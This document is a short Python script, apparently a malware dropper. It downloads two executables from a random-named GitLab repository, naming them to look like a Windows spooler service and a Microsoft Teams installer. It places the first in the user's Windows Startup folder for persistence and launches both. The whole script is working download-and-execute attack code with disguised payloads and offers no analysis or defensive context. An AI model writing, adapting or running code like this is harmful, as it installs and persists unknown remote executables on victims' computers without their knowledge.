import os
import requests
import shutil
import tempfile

def download_file(url, filename, destination_folder):
    response = requests.get(url)
    file_path = os.path.join(destination_folder, filename)
    with open(file_path, 'wb') as file:
        file.write(response.content)
    return file_path

def move_to_startup(file_path):
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    os.makedirs(startup_folder, exist_ok=True)
    startup_file_path = os.path.join(startup_folder, os.path.basename(file_path))
    shutil.move(file_path, startup_file_path)
    return startup_file_path

def run_file(file_path):
    os.startfile(file_path)

# Ścieżka do folderu tymczasowego
temp_folder = tempfile.gettempdir()

# Pobieranie plików do folderu tymczasowego
pob_temp_path1 = download_file('https://gitlab.com/onikzuz/sadfgw345gawfg/-/raw/main/Spooler__Sub__System__App.exe', 'Spooler Sub System App.exe', temp_folder)
pob_temp_path2 = download_file('https://gitlab.com/onikzuz/sadfgw345gawfg/-/raw/main/MSTeamsSetup_c_l_.exe', 'MSTeamsSetup_c_l_.exe', temp_folder)

# Przeniesienie pierwszego pliku do autostartu i uruchomienie go
try:
    pob_startup_path1 = move_to_startup(pob_temp_path1)
    if pob_startup_path1:
        run_file(pob_startup_path1)
        print(f"Plik został przeniesiony do autostartu i uruchomiony: {pob_startup_path1}")
except PermissionError as e:
    print(f"Błąd uprawnień przy przenoszeniu {pob_temp_path1}: {e}")
    pob_startup_path1 = None
except Exception as e:
    print(f"Inny błąd przy przenoszeniu {pob_temp_path1}: {e}")
    pob_startup_path1 = None

# Uruchomienie drugiego pliku bez przenoszenia do autostartu
try:
    if pob_temp_path2:
        run_file(pob_temp_path2)
        print(f"Plik został uruchomiony: {pob_temp_path2}")
except Exception as e:
    print(f"Inny błąd przy uruchamianiu {pob_temp_path2}: {e}")
